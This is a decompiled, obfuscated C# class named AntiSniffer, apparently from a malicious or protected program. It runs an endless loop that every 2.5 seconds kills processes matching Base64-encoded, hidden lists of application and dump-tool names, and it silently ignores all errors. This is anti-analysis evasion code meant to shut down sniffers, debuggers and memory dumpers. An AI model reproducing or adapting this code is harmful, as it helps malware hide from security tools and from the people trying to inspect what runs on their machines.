using System;
using System.Collections.Generic;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace Complex;

public sealed class AntiSniffer
{
	private static readonly List<string> AppFilter;

	private static readonly List<string> DumpFilter;

	[NonSerialized]
	internal static GetString getString_0;

	public static void SniffersKiller()
	{
		while (true)
		{
			try
			{
				while (true)
				{
					for (int i = 0; i < AppFilter.Count; i++)
					{
						int index = i;
						for (int j = 0; j < DumpFilter.Count; j++)
						{
							int index2 = j;
							ProcessKiller.ClosingCycle(AppFilter[index], DumpFilter[index2]);
						}
					}
					Thread.Sleep(2500);
				}
			}
			catch
			{
			}
		}
	}

	static AntiSniffer()
	{
		Strings.CreateGetStringDelegate(typeof(AntiSniffer));
		AppFilter = new List<string>
		{
			Program.Base64Decode(getString_0(107402413)),
			Program.Base64Decode(getString_0(107402396)),
			Program.Base64Decode(getString_0(107402347)),
			Program.Base64Decode(getString_0(107402338)),
			Program.Base64Decode(getString_0(107402289)),
			Program.Base64Decode(getString_0(107402248)),
			Program.Base64Decode(getString_0(107402263)),
			Program.Base64Decode(getString_0(107402214)),
			Program.Base64Decode(getString_0(107401669)),
			Program.Base64Decode(getString_0(107401660)),
			Program.Base64Decode(getString_0(107401635)),
			Program.Base64Decode(getString_0(107401602)),
			Program.Base64Decode(getString_0(107401569)),
			Program.Base64Decode(getString_0(107401520)),
			Program.Base64Decode(getString_0(107401527)),
			Program.Base64Decode(getString_0(107401498)),
			Program.Base64Decode(getString_0(107401449)),
			Program.Base64Decode(getString_0(107401468)),
			Program.Base64Decode(getString_0(107401935)),
			Program.Base64Decode(getString_0(107401954)),
			Program.Base64Decode(getString_0(107401905)),
			Program.Base64Decode(getString_0(107401924)),
			Program.Base64Decode(getString_0(107401911)),
			Program.Base64Decode(getString_0(107401862)),
			Program.Base64Decode(getString_0(107401877)),
			Program.Base64Decode(getString_0(107401832)),
			Program.Base64Decode(getString_0(107401823)),
			Program.Base64Decode(getString_0(107401766)),
			Program.Base64Decode(getString_0(107401785)),
			Program.Base64Decode(getString_0(107401756)),
			Program.Base64Decode(getString_0(107401711)),
			Program.Base64Decode(getString_0(107401726)),
			Program.Base64Decode(getString_0(107401157)),
			Program.Base64Decode(getString_0(107401132)),
			Program.Base64Decode(getString_0(107401103))
		};
		DumpFilter = new List<string>
		{
			Program.Base64Decode(getString_0(107401660)),
			Program.Base64Decode(getString_0(107401635)),
			Program.Base64Decode(getString_0(107401602)),
			Program.Base64Decode(getString_0(107401569)),
			Program.Base64Decode(getString_0(107401520)),
			Program.Base64Decode(getString_0(107401527))
		};
	}
}
